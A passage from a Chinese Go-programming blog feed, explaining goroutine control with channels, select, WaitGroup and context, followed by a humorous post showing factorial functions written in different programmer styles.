class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-stop:</span><br><span class="line">            fmt.Println(<span class="string">&quot;exit sub goroutine&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Println(<span class="string">&quot;running...&quot;</span>)</span><br><span class="line">            time.Sleep(<span class="number">500</span> * time.Millisecond)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        stop := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">        <span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">        <span class="comment">// Spawn example consumers</span></span><br><span class="line">        <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line">            wg.Add(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(stop &lt;-<span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">                <span class="keyword">defer</span> wg.Done()</span><br><span class="line">                consumer(stop)</span><br><span class="line">            &#125;(stop)</span><br><span class="line">        &#125;</span><br><span class="line">        waitForSignal()</span><br><span class="line">        <span class="built_in">close</span>(stop)</span><br><span class="line">        fmt.Println(<span class="string">&quot;stopping all jobs!&quot;</span>)</span><br><span class="line">        wg.Wait()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waitForSignal</span><span class="params">()</span></span> &#123;</span><br><span class="line">    sigs := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal)</span><br><span class="line">    signal.Notify(sigs, os.Interrupt)</span><br><span class="line">    signal.Notify(sigs, syscall.SIGTERM)</span><br><span class="line">    &lt;-sigs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以实现优雅等待所有子goroutine完全结束之后主进程才结束退出，借助了标准库sync里的Waitgroup，这是一种控制并发的方式，可以实现对多goroutine的等待，官方文档是这样描述的</p>
<p>- A WaitGroup waits for a collection of goroutines to finish. The main goroutine calls Add to set the number of goroutines to wait for.<br>- Then each of the goroutines runs and calls Done when finished. At the same time, Wait can be used to block until all goroutines have finished.</p>
<p>简单来讲，它的源码里实现了一个类似计数器的结构，记录每一个在它那里注册过的协程，然后每一个协程完成任务之后需要到它那里注销，然后在主进程那里可以等待直至所有协程完成任务退出。</p>
<h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><p>1. 创建一个Waitgroup的实例wg；<br>2. 在每个goroutine启动的时候，调用wg.Add(1)注册；<br>3. 在每个goroutine完成任务后退出之前，调用wg.Done()注销。<br>4. 在等待所有goroutine的地方调用wg.Wait()阻塞进程，知道所有goroutine都完成任务调用wg.Done()注销之后，Wait()方法会返回。</p>
<p>该示例程序是一种golang的select+channel的典型用法，我们来稍微深入一点分析一下这种典型用法：</p>
<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>首先了解下channel，可以理解为管道，它的主要功能点是：</p>
<ol>
<li>队列存储数据  </li>
<li>阻塞和唤醒goroutine</li>
</ol>
<p>channel 实现集中在文件 runtime&#x2F;chan.go 中，channel底层数据结构是这样的：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> hchan <span class="keyword">struct</span> &#123;</span><br><span class="line">    qcount   <span class="type">uint</span>           <span class="comment">// 队列中数据个数</span></span><br><span class="line">    dataqsiz <span class="type">uint</span>           <span class="comment">// channel 大小</span></span><br><span class="line">    buf      unsafe.Pointer <span class="comment">// 存放数据的环形数组</span></span><br><span class="line">    elemsize <span class="type">uint16</span>         <span class="comment">// channel 中数据类型的大小</span></span><br><span class="line">    closed   <span class="type">uint32</span>         <span class="comment">// 表示 channel 是否关闭</span></span><br><span class="line">    elemtype *_type <span class="comment">// 元素数据类型</span></span><br><span class="line">    sendx    <span class="type">uint</span>   <span class="comment">// send 的数组索引</span></span><br><span class="line">    recvx    <span class="type">uint</span>   <span class="comment">// recv 的数组索引</span></span><br><span class="line">    recvq    waitq  <span class="comment">// 由 recv 行为（也就是 &lt;-ch）阻塞在 channel 上的 goroutine 队列</span></span><br><span class="line">    sendq    waitq  <span class="comment">// 由 send 行为 (也就是 ch&lt;-) 阻塞在 channel 上的 goroutine 队列</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// lock protects all fields in hchan, as well as several</span></span><br><span class="line">    <span class="comment">// fields in sudogs blocked on this channel.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Do not change another G&#x27;s status while holding this lock</span></span><br><span class="line">    <span class="comment">// (in particular, do not ready a G), as this can deadlock</span></span><br><span class="line">    <span class="comment">// with stack shrinking.</span></span><br><span class="line">    lock mutex</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码可以看出它其实就是一个队列加一个锁（轻量），代码本身不复杂，但涉及到上下文很多细节，故而不易通读，有兴趣的同学可以去看一下，我的建议是，从上面总结的两个功能点出发，一个是 ring buffer，用于存数据； 一个是存放操作（读写）该channel的goroutine 的队列。</p>
<h2 id="buf是一个通用指针，用于存储数据，看源码时重点关注对这个变量的读写"><a href="#buf是一个通用指针，用于存储数据，看源码时重点关注对这个变量的读写" class="headerlink" title="buf是一个通用指针，用于存储数据，看源码时重点关注对这个变量的读写"></a>buf是一个通用指针，用于存储数据，看源码时重点关注对这个变量的读写</h2><p>recvq 是读操作阻塞在 channel 的 goroutine 列表，sendq 是写操作阻塞在 channel 的 goroutine 列表。列表的实现是 sudog，其实就是一个对 g 的结构的封装，看源码时重点关注，是怎样通过这两个变量阻塞和唤醒goroutine的</p>
<p>由于涉及源码较多，这里就不再深入。</p>
<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>然后是select机制，golang 的 select 机制可以理解为是在语言层面实现了和 select, poll, epoll 相似的功能：监听多个描述符的读&#x2F;写等事件，一旦某个描述符就绪（一般是读或者写事件发生了），就能够将发生的事件通知给关心的应用程序去处理该事件。 golang 的 select 机制是，监听多个channel，每一个 case 是一个事件，可以是读事件也可以是写事件，随机选择一个执行，可以设置default，它的作用是：当监听的多个事件都阻塞住会执行default的逻辑。</p>
<p>select的源码在runtime&#x2F;select.go ，看的时候建议是重点关注 pollorder 和 lockorder</p>
<p>pollorder保存的是scase的序号，乱序是为了之后执行时的随机性。</p>
<p>lockorder保存了所有case中channel的地址，这里按照地址大小堆排了一下lockorder对应的这片连续内存。对chan排序是为了去重，保证之后对所有channel上锁时不会重复上锁。</p>
<p>因为我对这部分源码研究得也不是很深，故而点到为止即可，有兴趣的可以去看看源码啦！</p>
<p>具体到demo代码：consumer为协程的具体代码，里面是只有一个不断轮询channel变量stop的循环，所以主进程是通过stop来通知子协程何时该结束运行的，在main方法中，close掉stop之后，读取已关闭的channel会立刻返回该channel数据类型的零值，因此子goroutine里的&lt;-stop操作会马上返回，然后退出运行。</p>
<p>事实上，通过channel控制子goroutine的方法可以总结为：循环监听一个channel，一般来说是for循环里放一个select监听channel以达到通知子goroutine的效果。再借助Waitgroup，主进程可以等待所有协程优雅退出后再结束自己的运行，这就通过channel实现了优雅控制goroutine并发的开始和结束。</p>
<p>channel通信控制基于CSP模型，相比于传统的线程与锁并发模型，避免了大量的加锁解锁的性能消耗，而又比Actor模型更加灵活，使用Actor模型时，负责通讯的媒介与执行单元是紧耦合的–每个Actor都有一个信箱。而使用CSP模型，channel是第一对象，可以被独立地创建，写入和读出数据，更容易进行扩展。</p>
<h2 id="杀器Context"><a href="#杀器Context" class="headerlink" title="杀器Context"></a>杀器Context</h2><p>Context通常被译作上下文，它是一个比较抽象的概念。在讨论链式调用技术时也经常会提到上下文。一般理解为程序单元的一个运行状态、现场、快照，而翻译中上下又很好地诠释了其本质，上下则是存在上下层的传递，上会把内容传递给下。在Go语言中，程序单元也就指的是Goroutine。</p>
<p>每个Goroutine在执行之前，都要先知道程序当前的执行状态，通常将这些执行状态封装在一个Context变量中，传递给要执行的Goroutine中。上下文则几乎已经成为传递与请求同生存周期变量的标准方法。在网络编程下，当接收到一个网络请求Request，在处理这个Request的goroutine中，可能需要在当前gorutine继续开启多个新的Goroutine来获取数据与逻辑处理（例如访问数据库、RPC服务等），即一个请求Request，会需要多个Goroutine中处理。而这些Goroutine可能需要共享Request的一些信息；同时当Request被取消或者超时的时候，所有从这个Request创建的所有Goroutine也应该被结束。</p>
<p>context在go1.7之后被引入到标准库中，1.7之前的go版本使用context需要安装golang.org&#x2F;x&#x2F;net&#x2F;context包，关于golang context的更详细说明，可参考官方文档：context</p>
<h2 id="Context初试"><a href="#Context初试" class="headerlink" title="Context初试"></a>Context初试</h2><p>Context的创建和调用关系是层层递进的，也就是我们通常所说的链式调用，类似数据结构里的树，从根节点开始，每一次调用就衍生一个叶子节点。首先，生成根节点，使用context.Background方法生成，而后可以进行链式调用使用context包里的各类方法，context包里的所有方法</p>
<p>- func Background() Context<br>- func TODO() Context<br>- func WithCancel(parent Context) (ctx Context, cancel CancelFunc)<br>- func WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)<br>- func WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)<br>- func WithValue(parent Context, key, val interface{}) Context</p>
<p>这里仅以WithCancel和WithValue方法为例来实现控制并发和通信</p>
<h2 id="话不多说，上码"><a href="#话不多说，上码" class="headerlink" title="话不多说，上码"></a>话不多说，上码</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> favContextKey <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    wg := &amp;sync.WaitGroup&#123;&#125;</span><br><span class="line">    values := []<span class="type">string</span>&#123;<span class="string">&quot;https://www.baidu.com/&quot;</span>, <span class="string">&quot;https://www.zhihu.com/&quot;</span>&#125;</span><br><span class="line">    ctx, cancel := context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, url := <span class="keyword">range</span> values &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        subCtx := context.WithValue(ctx, favContextKey(<span class="string">&quot;url&quot;</span>), url)</span><br><span class="line">        <span class="keyword">go</span> reqURL(subCtx, wg)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line">        cancel()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    wg.Wait()</span><br><span class="line">    fmt.Println(<span class="string">&quot;exit main goroutine&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reqURL</span><span class="params">(ctx context.Context, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line">    url, _ := ctx.Value(favContextKey(<span class="string">&quot;url&quot;</span>)).(<span class="type">string</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            fmt.Printf(<span class="string">&quot;stop getting url:%s\n&quot;</span>, url)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            r, err := http.Get(url)</span><br><span class="line">            <span class="keyword">if</span> r.StatusCode == http.StatusOK &amp;&amp; err == <span class="literal">nil</span> &#123;</span><br><span class="line">                body, _ := ioutil.ReadAll(r.Body)</span><br><span class="line">                subCtx := context.WithValue(ctx, favContextKey(<span class="string">&quot;resp&quot;</span>), fmt.Sprintf(<span class="string">&quot;%s%x&quot;</span>, url, md5.Sum(body)))</span><br><span class="line">                wg.Add(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">go</span> showResp(subCtx, wg)</span><br><span class="line">            &#125;</span><br><span class="line">            r.Body.Close()</span><br><span class="line">            <span class="comment">//启动子goroutine是为了不阻塞当前goroutine，这里在实际场景中可以去执行其他逻辑，这里为了方便直接sleep一秒</span></span><br><span class="line">            <span class="comment">// doSometing()</span></span><br><span class="line">            time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showResp</span><span class="params">(ctx context.Context, wg *sync.WaitGroup)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> wg.Done()</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">            fmt.Println(<span class="string">&quot;stop showing resp&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">//子goroutine里一般会处理一些IO任务，如读写数据库或者rpc调用，这里为了方便直接把数据打印</span></span><br><span class="line">            fmt.Println(<span class="string">&quot;printing &quot;</span>, ctx.Value(favContextKey(<span class="string">&quot;resp&quot;</span>)))</span><br><span class="line">            time.Sleep(time.Second * <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面我们说过Context就是设计用来解决那种多个goroutine处理一个Request且这多个goroutine需要共享Request的一些信息的场景，以上是一个简单模拟上述过程的demo。</p>
<p>首先调用context.Background()生成根节点，然后调用withCancel方法，传入根节点，得到新的子Context以及根节点的cancel方法（通知所有子节点结束运行），这里要注意：该方法也返回了一个Context，这是一个新的子节点，与初始传入的根节点不是同一个实例了，但是每一个子节点里会保存从最初的根节点到本节点的链路信息 ，才能实现链式。</p>
<p>程序的reqURL方法接收一个url，然后通过http请求该url获得response，然后在当前goroutine里再启动一个子groutine把response打印出来，然后从ReqURL开始Context树往下衍生叶子节点（每一个链式调用新产生的ctx）,中间每个ctx都可以通过WithValue方式传值（实现通信），而每一个子goroutine都能通过Value方法从父goroutine取值，实现协程间的通信，每个子ctx可以调用Done方法检测是否有父节点调用cancel方法通知子节点退出运行，根节点的cancel调用会沿着链路通知到每一个子节点，因此实现了强并发控制，流程如图：</p>
<p>该demo结合前面说的WaitGroup实现了优雅并发控制和通信，关于WaitGroup的原理和使用前文已做解析，这里便不再赘述，当然，实际的应用场景不会这么简单，处理Request的goroutine启动多个子goroutine大多是处理IO密集的任务如读写数据库或rpc调用，然后在主goroutine中继续执行其他逻辑，这里为了方便讲解做了最简单的处理。</p>
<p>Context作为golang中并发控制和通信的大杀器，被广泛应用，一些使用go开发http服务的同学如果阅读过这些很多 web framework的源码就知道，Context在web framework随处可见，因为http请求处理就是一个典型的链式过程以及并发场景，所以很多web framework都会借助Context实现链式调用的逻辑。有兴趣可以读一下context包的源码，会发现Context的实现其实是结合了Mutex锁和channel而实现的，其实并发、同步的很多高级组件万变不离其宗，都是通过最底层的数据结构组装起来的，只要知晓了最基础的概念，上游的架构也可以一目了然。</p>
<h2 id="context使用规范"><a href="#context使用规范" class="headerlink" title="context使用规范"></a>context使用规范</h2><p>最后，Context虽然是神器，但开发者使用也要遵循基本法，以下是一些Context使用的规范</p>
<p>- Do not store Contexts inside a struct type; instead, pass a Context explicitly to each function that needs it. The Context should be the first parameter, typically named ctx；不要把Context存在一个结构体当中，显式地传入函数。Context变量需要作为第一个参数使用，一般命名为ctx；</p>
<p>- Do not pass a nil Context, even if a function permits it. Pass context.TODO if you are unsure about which Context to use；即使方法允许，也不要传入一个nil的Context，如果你不确定你要用什么Context的时候传一个context.TODO；</p>
<p>- Use context Values only for request-scoped data that transits processes and APIs, not for passing optional parameters to functions；使用context的Value相关方法只应该用于在程序和接口中传递的和请求相关的元数据，不要用它来传递一些可选的参数；</p>
<p>- The same Context may be passed to functions running in different goroutines; Contexts are safe for simultaneous use by multiple goroutines；同样的Context可以用来传递到不同的goroutine中，Context在多个goroutine中是安全的；</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <span class="exturl" data-url="aHR0cHM6Ly9kZWVwenouY29tL3Bvc3QvZ29sYW5nLWNvbnRleHQtcGFja2FnZS1ub3Rlcy5odG1s">https://deepzz.com/post/golang-context-package-notes.html<i class="fa fa-external-link-alt"></i></span><br>[2] <span class="exturl" data-url="aHR0cDovL3d3dy5mbHlzbm93Lm9yZy8yMDE3LzA1LzEyL2dvLWluLWFjdGlvbi1nby1jb250ZXh0Lmh0bWw=">http://www.flysnow.org/2017/05/12/go-in-action-go-context.html<i class="fa fa-external-link-alt"></i></span><br>[3] <span class="exturl" data-url="aHR0cHM6Ly9nb2xhbmcub3JnL3BrZy9jb250ZXh0Lw==">https://golang.org/pkg/context/<i class="fa fa-external-link-alt"></i></span><br>[4] <span class="exturl" data-url="aHR0cDovL3d3dy5tb3llLm1lLzIwMTcvMDUvMDUvZ28tY29uY3VycmVuY3ktcGF0dGVybnMv">http://www.moye.me/2017/05/05/go-concurrency-patterns/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Goroutines</tag>
      </tags>
  </entry>
  <entry>
    <title>Go 程序员的演变</title>
    <url>/2020/03/go-programer/</url>
    <content><![CDATA[<h2 id="通过一个阶乘函数的不同写法将-Go-程序员进行划分。"><a href="#通过一个阶乘函数的不同写法将-Go-程序员进行划分。" class="headerlink" title="通过一个阶乘函数的不同写法将 Go 程序员进行划分。"></a>通过一个阶乘函数的不同写法将 Go 程序员进行划分。</h2><h2 id="初级-Go-程序员"><a href="#初级-Go-程序员" class="headerlink" title="初级 Go 程序员"></a>初级 Go 程序员</h2><span id="more"></span>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	res := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">		res *= i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="函数式-Go-程序员"><a href="#函数式-Go-程序员" class="headerlink" title="函数式 Go 程序员"></a>函数式 Go 程序员</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> Factorial(n - <span class="number">1</span>) * n</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="泛型-Go-程序员"><a href="#泛型-Go-程序员" class="headerlink" title="泛型 Go 程序员"></a>泛型 Go 程序员</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">	v, valid := n.(<span class="type">int</span>)</span><br><span class="line">	<span class="keyword">if</span> !valid &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= v; i++ &#123;</span><br><span class="line">		res *= i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="多线程优化的-Go-程序员"><a href="#多线程优化的-Go-程序员" class="headerlink" title="多线程优化的 Go 程序员"></a>多线程优化的 Go 程序员</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		left, right = <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">		wg sync.WaitGroup</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	wg.Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	pivot := n / <span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; pivot; i++ &#123;</span><br><span class="line">			left *= i</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		wg.Done()</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := pivot; i &lt;= n; i++ &#123;</span><br><span class="line">			right *= i</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		wg.Done()</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	wg.Wait()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> left * right</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="发现型-Go-模式"><a href="#发现型-Go-模式" class="headerlink" title="发现型 Go 模式"></a>发现型 Go 模式</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="type">int</span>)</span></span> &lt;-<span class="keyword">chan</span> <span class="type">int</span> &#123;</span><br><span class="line">	ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		prev := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">			v := prev * i</span><br><span class="line"></span><br><span class="line">			ch &lt;- v</span><br><span class="line"></span><br><span class="line">			prev = v</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">close</span>(ch)</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ch</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="使用成熟的解决方案修复-Go-缺陷"><a href="#使用成熟的解决方案修复-Go-缺陷" class="headerlink" title="使用成熟的解决方案修复 Go 缺陷"></a>使用成熟的解决方案修复 Go 缺陷</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> https://en.wikipedia.org/wiki/Factorial</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">type IFactorial <span class="keyword">interface</span> &#123;</span><br><span class="line">	CalculateFactorial() int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// FactorialImpl implements IFactorial.</span></span><br><span class="line"><span class="keyword">var</span> _ IFactorial = (*FactorialImpl)(nil)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Used to find factorial of the n.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">type FactorialImpl struct &#123;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * The n.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	n int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor of the FactorialImpl.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n the n.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func NewFactorial(n int) *FactorialImpl &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;FactorialImpl&#123;</span><br><span class="line">		n: n,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the n to use in factorial function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func (<span class="keyword">this</span> *FactorialImpl) GetN() int &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Sets the n to use in factorial function.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n the n.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func (<span class="keyword">this</span> *FactorialImpl) SetN(n int) &#123;</span><br><span class="line">	<span class="keyword">this</span>.n = n</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns factorial of the n.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@todo</span> remove &quot;if&quot; statement. Maybe we should use a factory or somthing?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> int.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func (<span class="keyword">this</span> *FactorialImpl) CalculateFactorial() int &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">this</span>.n == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	n := <span class="keyword">this</span>.n</span><br><span class="line">	<span class="keyword">this</span>.n = <span class="keyword">this</span>.n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span>.CalculateFactorial() * n</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="高级-Go-程序员"><a href="#高级-Go-程序员" class="headerlink" title="高级 Go 程序员"></a>高级 Go 程序员</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> fac</span><br><span class="line"></span><br><span class="line"><span class="comment">// Factorial returns n!.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Factorial</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	res := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">		res *= i</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

